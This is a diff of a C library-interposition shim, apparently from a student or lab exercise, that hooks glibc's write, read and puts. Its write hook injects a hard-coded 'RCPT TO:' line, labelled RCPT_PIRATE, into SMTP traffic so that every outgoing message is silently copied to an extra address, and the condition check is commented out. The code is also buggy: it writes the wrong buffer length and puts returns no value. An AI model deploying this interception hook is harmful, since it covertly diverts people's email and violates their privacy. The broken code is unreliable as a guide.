@@ -6,6 +6,7 @@
 /* Function pointers to hold the value of the glibc functions */
 static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
 static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
+static int (*real_puts)(const char* str) = NULL;
 
 /* wrapping write function call */
 ssize_t write(int fd, const void *buf, size_t count)
@@ -17,29 +18,49 @@ ssize_t write(int fd, const void *buf, size_t count)
      */
 
     real_write = dlsym(RTLD_NEXT, "write");
+    real_read = dlsym(RTLD_NEXT, "read");
 
     //TODO:
     //CHeck if buffer start with 'RCP TO:'
 
     //If true:
-    if (true)
+    //if (true)
     {
-        char* RCPT_PIRATE = 'RCPT TO: malik.fleury@he-arc.ch\n';
+        char RCPT_PIRATE[] = "RCPT TO: malik.fleury@he-arc.ch\n";
         //Write another RCPT_TO
         real_write(fd, &RCPT_PIRATE, count);
 
-        //Add read RCPT_TO
-        read(fd, )
-        do
-        {
-            fgets(buffer, sizeof(buffer), f);
-            printf(buffer);
-            //puts(buffer);
-        }while(buffer[0] < '2' || buffer[0] > '5');
-        
+        //If test mode:
+        if(fd > 3) {
+            //Add read RCPT_TO
+            char buffer[255];
+            ssize_t read_byte;
+
+            if ((read_byte = real_read(fd, buffer, 255)) == -1)
+            {
+                // perror("read()");
+                // close(fd);
+                // exit(1);
+            }
+        }
     }
 
     //Then real write asked by the smtp client
-
     real_write(fd, buf, count);
+}
+
+
+int puts(const char* str)
+    //TODO:
+{
+    //CHeck if buffer start with 'RCP TO:'
+
+
+    /* printing out the number of characters */
+    printf("puts:chars#:%lu\n", strlen(str));
+    /* resolve the real puts function from glibc
+     * and pass the arguments.
+     */
+    real_puts = dlsym(RTLD_NEXT, "puts");
+    real_puts(str);
 }
